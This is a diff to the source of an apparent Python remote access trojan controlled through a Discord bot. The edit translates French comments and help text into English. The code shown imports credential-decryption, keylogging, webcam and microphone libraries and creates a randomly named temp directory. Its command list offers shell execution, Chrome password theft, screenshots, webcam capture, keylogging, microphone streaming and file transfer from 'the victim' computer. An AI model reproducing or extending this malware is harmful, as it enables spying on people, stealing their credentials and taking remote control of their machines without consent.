@@ -12,36 +12,30 @@ import shutil
 import win32crypt
 import requests
 from Crypto.Cipher import AES
-from PIL import ImageGrab  # Pour prendre un screenshot
-import io  # Pour manipuler l'image en mémoire
-import pynput  # Pour enregistrer les frappes clavier
-import threading  # Pour exécuter le keylogger en parallèle
-import pyaudio  # Pour capturer l'audio du micro
-import cv2  # Pour capturer des images avec la webcam
-import GPUtil  # Pour récupérer les informations GPU
+from PIL import ImageGrab  
+import io  
+import pynput  
+import threading  
+import pyaudio  
+import cv2  
+import GPUtil 
 
 # Variables pour Discord
-DISCORD_BOT_TOKEN = 'ton token de bot discord'  # Remplace par ton token Discord
+DISCORD_BOT_TOKEN = 'your bot token'
 
 intents = discord.Intents.default()
 intents.message_content = True
 client = discord.Client(intents=intents)
-
-# Stocker le répertoire de travail actuel
 current_directory = os.getcwd()
-
-# Créer un répertoire temporaire avec un nom aléatoire dans %TEMP%
 temp_dir = os.path.join(os.environ['TEMP'], ''.join(random.choices(string.ascii_letters + string.digits, k=10)))
 os.makedirs(temp_dir, exist_ok=True)
 
-# Lorsque le bot se connecte
 @client.event
 async def on_ready():
     print(f'Bot connecté en tant que {client.user}')
 
-    # Vérifier si le bot est dans un serveur et créer un canal
     if client.guilds:
-        guild = client.guilds[0]  # Prendre le premier serveur
+        guild = client.guilds[0] 
         new_channel = await create_random_channel(guild)
         await new_channel.send("Bot actif ! Faites !help pour voir les commandes disponibles !")
 
@@ -66,21 +60,21 @@ async def on_message(message):
     if message.content.startswith('!help'):
         help_text = """
     **Commandes disponibles**:
-    - `!help` : Affiche cette aide.
-    - `!sysinfo` : Affiche les informations système.
-    - `!cmd <commande>` : Exécute une commande système.
-    - `!cmd cd <directory>` : Change le répertoire de travail.
-    - `!grab_passwd` : Récupère les mots de passe enregistrés dans Chrome et les envoie.
-    - `!screen` : Capture une capture d'écran et l'envoie.
-    - `!screen_cam` : Capture une image via la webcam et l'envoie.
-    - `!history` : Affiche l'historique de navigation de Chrome.
-    - `!key_logger` : Enregistre les frappes clavier et les envoie.
-    - `!mic_stream` : Crée un salon vocal et connecte le bot.
-    - `!process` : Affiche tous les processus en cours d'utilisation.
-    - `!kill_process <nom du processus>` : Tue un processus.
-    - `!open_process <nom du processus>` : Ouvre un processus.
-    - `!upload <url> <save_path>` : Télécharge un fichier depuis une URL et le sauvegarde.
-    - `!download <file_path>` : Télécharge un fichier depuis l'ordinateur de la victime.
+    - `!help` : show this help
+    - `!sysinfo` : show sysinfos
+    - `!cmd <commande>` : execute a shell command
+    - `!cmd cd <directory>` : Change directory on the shell
+    - `!grab_passwd` : grab the passwords on chrome
+    - `!screen` : take a screenshot
+    - `!screen_cam` : take a screenshot from the camera
+    - `!history` : show the history of chrome
+    - `!key_logger` : just a keylogger
+    - `!mic_stream` : create a vocal channel when you hear the mic of the victim (in prototype)
+    - `!process` : show all process
+    - `!kill_process <name of the process>` : kill a process
+    - `!open_process <name of the process>` : open a process
+    - `!upload <url> <save_path>` : upload a file on the computer
+    - `!download <file_path>` : download a file from the computer
     """
         await message.channel.send(help_text)
 
